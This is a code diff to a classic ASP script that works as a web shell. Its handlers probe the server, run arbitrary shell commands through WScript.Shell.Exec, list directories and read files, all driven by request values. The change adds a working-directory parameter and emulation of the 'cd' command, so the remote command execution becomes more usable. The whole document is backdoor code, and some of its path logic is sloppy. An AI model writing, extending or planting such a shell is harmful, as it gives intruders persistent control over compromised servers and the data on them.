@@ -156,9 +156,24 @@ Function DoEnv()
   ver = ScriptEngine() & " " & ScriptEngineMajorVersion & "." & ScriptEngineMinorVersion & "." & ScriptEngineBuildVersion
   DoEnv = "{""ok"":true,""data"":{""server"":""" & EscJson(Request.ServerVariables("SERVER_SOFTWARE")) & """,""web_server"":""" & EscJson(Request.ServerVariables("SERVER_SOFTWARE")) & """,""php_version"":""" & EscJson(ver) & """,""current_dir"":""" & EscJson(cwd) & """,""separator"":""\\""}}"
 End Function
-Function DoExec(c)
+Function DoExec(c, w)
   On Error Resume Next
-  Dim sh, p, outv, bytes
+  Dim sh, p, outv, bytes, m, t
+  If w <> "" Then
+    Set sh = CreateObject("WScript.Shell")
+    On Error Resume Next
+    sh.CurrentDirectory = w
+    On Error Resume Next
+  End If
+  If Left(Trim(c), 2) = "cd" And (Len(Trim(c)) = 2 Or Mid(Trim(c), 3, 1) = " ") Then
+    t = Trim(Mid(c, 3))
+    If t <> "" Then
+      Set fso = CreateObject("Scripting.FileSystemObject")
+      If Left(t, 1) <> "" And Left(t, 1) <> "/" Then t = w & "" & t
+      DoExec = "{""ok"":true,""data"":{""stdout"":"""",""cwd"":""" & EscJson(fso.GetAbsolutePathName(t)) & """}}"
+      Exit Function
+    End If
+  End If
   Set sh = CreateObject("WScript.Shell")
   Set p = sh.Exec(c)
   outv = p.StdOut.ReadAll
@@ -284,7 +299,7 @@ outv = "{""ok"":false,""error"":""unsupported""}"
 If action = "probe" Then
   outv = DoEnv()
 ElseIf action = "exec" Then
-  outv = DoExec(GetVal(plain, "c"))
+  outv = DoExec(GetVal(plain, "c"), GetVal(plain, "w"))
 ElseIf action = "list" Then
   outv = DoList(GetVal(plain, "p"))
 ElseIf action = "read" Then
